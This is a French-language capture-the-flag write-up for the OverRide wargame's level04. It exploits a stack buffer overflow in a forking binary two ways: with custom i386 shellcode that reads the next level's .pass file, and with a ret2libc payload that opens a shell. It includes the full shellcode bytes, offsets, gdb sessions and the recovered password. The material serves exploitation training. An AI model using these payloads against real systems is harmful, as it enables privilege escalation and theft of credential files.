# Level04

Nous remarquons la présence d'un fork, ainsi que des check, qui arrête le programme, si un execve est appelé.
Nous devons réaliser notre propre [shellcode](./resources/shellcode_file_reader.s) pour lire un fichier en architecture i386,
il fera un open, read et write sur le fichier `.pass` du level suivant.

Nous l'assemblons avec `nasm` et le linker `ld` pour pouvoir récupérer le shellcode en hexa.

```
nasm -f elf32 ./resources/shellcode_file_reader.s -o ./resources/shellcode.o
ld -m elf_i386 ./resources/shellcode.o -o ./resources/shellcode
chmod +x ./resources/shellcode
```

Ensuite nous récupérons son code en hexa grâce à `objdump`.

```
$ objdump -d resources/shellcode

resources/shellcode:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	31 c9                	xor    %ecx,%ecx
 8049002:	f7 e1                	mul    %ecx

08049004 <open>:
 8049004:	b0 05                	mov    $0x5,%al
 8049006:	51                   	push   %ecx
 8049007:	68 70 61 73 73       	push   $0x73736170
 804900c:	68 30 35 2f 2e       	push   $0x2e2f3530
 8049011:	68 65 76 65 6c       	push   $0x6c657665
 8049016:	68 72 73 2f 6c       	push   $0x6c2f7372
 804901b:	68 2f 75 73 65       	push   $0x6573752f
 8049020:	68 68 6f 6d 65       	push   $0x656d6f68
 8049025:	68 2f 2f 2f 2f       	push   $0x2f2f2f2f
 804902a:	89 e3                	mov    %esp,%ebx
 804902c:	cd 80                	int    $0x80

0804902e <read>:
 804902e:	93                   	xchg   %eax,%ebx
 804902f:	91                   	xchg   %eax,%ecx
 8049030:	b0 03                	mov    $0x3,%al
 8049032:	66 ba ff 0f          	mov    $0xfff,%dx
 8049036:	42                   	inc    %edx
 8049037:	cd 80                	int    $0x80

08049039 <write>:
 8049039:	92                   	xchg   %eax,%edx
 804903a:	b3 01                	mov    $0x1,%bl
 804903c:	c1 e8 0a             	shr    $0xa,%eax
 804903f:	cd 80                	int    $0x80

08049041 <exit>:
 8049041:	93                   	xchg   %eax,%ebx
 8049042:	cd 80                	int    $0x80

```

Ce qui nous donne :
```
\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x01\xc1\xe8\x0a\xcd\x80\x93\xcd\x80
```

Nous devons maintenant trouver l'offset pour injecter le shellcode ainsi que son adresse.
On lance gdb normalement puis on le passe en mode debugging forks child:

```
set follow-fork-mode child
```

De la même manière qu'auparavant on trouve l'offset à 156 bytes.

on export tout d'abord le shellcode dans l'env comme ci-dessous:
```
level04@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x01\xc1\xe8\x0a\xcd\x80\x93\xcd\x80"'`
```

puis on trouve l'adressse du `NOP` le plus proche du shellcode:
```0xffffd8b0```

Place à l'injection:
```
level04@OverRide:~$ python -c 'print "B" * 156 + "\xb0\xd8\xff\xff"' | ./level04
```

# Methode 2 (ret2libc)

Création du ret2libc, pour cela nous avons besoin de l'adresse de `system` d´`exit` et de `/bin/sh` dans la libc.
```
$ gdb ./level04
(gdb) b main
(gdb) r
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit
...

(gdb) info function system                                                                                                                                    [17/354]
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
(gdb) info proc map
process 1996
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) quit
```
Ensuite on va composer notre payload : padding + system + exit + /bin/sh
```
level04@OverRide:~$ (python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"';cat) | ./level04
Give me some shellcode, k

id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat ~level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
